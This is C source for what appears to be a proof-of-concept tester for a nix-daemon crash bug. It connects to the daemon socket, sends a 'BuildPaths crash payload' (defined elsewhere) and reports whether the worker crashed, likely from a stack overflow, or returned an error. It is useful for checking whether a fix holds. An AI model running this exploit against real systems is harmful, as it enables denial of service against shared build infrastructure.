static void usage(const char *prog)
{
    fprintf(stderr,
        "usage: %s [SOCKET_PATH]\n"
        "\n"
        "Socket resolution order: argument, NIX_DAEMON_SOCKET_PATH,\n"
        "NIX_REMOTE=unix://PATH, then " DEFAULT_SOCKET ".\n",
        prog);
}

static const char *resolve_socket(const char *arg)
{
    const char *path;

    if (arg)
        return arg;

    path = getenv("NIX_DAEMON_SOCKET_PATH");
    if (path && *path)
        return path;

    path = getenv("NIX_REMOTE");
    if (path && strncmp(path, "unix://", 7) == 0 && path[7])
        return path + 7;

    return DEFAULT_SOCKET;
}

static int send_all(int fd, const unsigned char *buf, size_t len)
{
    size_t off = 0;

    while (off < len) {
        ssize_t n = send(fd, buf + off, len - off, MSG_NOSIGNAL);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0) {
            errno = EPIPE;
            return -1;
        }
        off += (size_t) n;
    }

    return 0;
}

/*
 * Read the daemon's reply until it closes the connection (the worker dies
 * while parsing the request) or until the timeout expires.
 */
static int drain_reply(int fd, unsigned char *buf, size_t cap, size_t *len)
{
    struct pollfd pfd = { .fd = fd, .events = POLLIN };

    *len = 0;

    for (;;) {
        int rc = poll(&pfd, 1, REPLY_TIMEOUT_MS);
        if (rc < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (rc == 0)
            return 0; /* timeout */

        ssize_t n = recv(fd, buf + *len, cap - *len - 1, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return 1; /* EOF: daemon worker exited */
        if (*len + (size_t) n >= cap)
            return 1;
        *len += (size_t) n;
    }
}

/* STDERR_ERROR, little-endian 0x63787470: sent when the daemon rejects a request normally. */
static int has_error_reply(const unsigned char *buf, size_t len)
{
    static const unsigned char marker[4] = { 0x70, 0x74, 0x78, 0x63 };

    if (len < sizeof marker)
        return 0;
    for (size_t i = 0; i + sizeof marker <= len; i++)
        if (memcmp(buf + i, marker, sizeof marker) == 0)
            return 1;
    return 0;
}

int main(int argc, char **argv)
{
    const char *path;
    struct sockaddr_un addr;
    unsigned char reply[MAX_REPLY];
    size_t reply_len = 0;
    int fd, rc, status = 1;

    if (argc > 2) {
        usage(argv[0]);
        return 2;
    }

    path = resolve_socket(argc == 2 ? argv[1] : NULL);
    if (strlen(path) >= sizeof addr.sun_path) {
        fprintf(stderr, "socket path too long: %s\n", path);
        return 1;
    }

    signal(SIGPIPE, SIG_IGN);

    fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) {
        perror("socket");
        return 1;
    }

    memset(&addr, 0, sizeof addr);
    addr.sun_family = AF_UNIX;
    memcpy(addr.sun_path, path, strlen(path) + 1);

    if (connect(fd, (struct sockaddr *) &addr, sizeof addr) < 0) {
        fprintf(stderr, "connect(%s): %s\n", path, strerror(errno));
        fprintf(stderr, "is nix-daemon running and is this the right socket?\n");
        goto out;
    }
    printf("connected to %s\n", path);

    if (send_all(fd, crash_payload, sizeof crash_payload) < 0) {
        fprintf(stderr, "send: %s\n", strerror(errno));
        goto out;
    }
    printf("sent %zu-byte BuildPaths crash payload\n", sizeof crash_payload);

    /* Tell the daemon no BuildMode word will follow the derived-path vector. */
    if (shutdown(fd, SHUT_WR) < 0)
        fprintf(stderr, "shutdown(SHUT_WR): %s\n", strerror(errno));

    rc = drain_reply(fd, reply, sizeof reply, &reply_len);
    if (rc < 0) {
        fprintf(stderr, "read reply: %s\n", strerror(errno));
        goto out;
    }
    if (rc == 0) {
        fprintf(stderr,
            "daemon did not close the connection within %d ms\n",
            REPLY_TIMEOUT_MS);
        goto out;
    }

    printf("daemon closed the connection after %zu bytes of reply\n", reply_len);
    if (has_error_reply(reply, reply_len))
        printf("daemon sent a protocol error instead of crashing (bug likely fixed)\n");
    else
        printf("no error reply: the daemon worker most likely crashed "
               "(check journalctl -u nix-daemon for a stack overflow)\n");

    status = 0;

out:
    close(fd);
    return status;
}
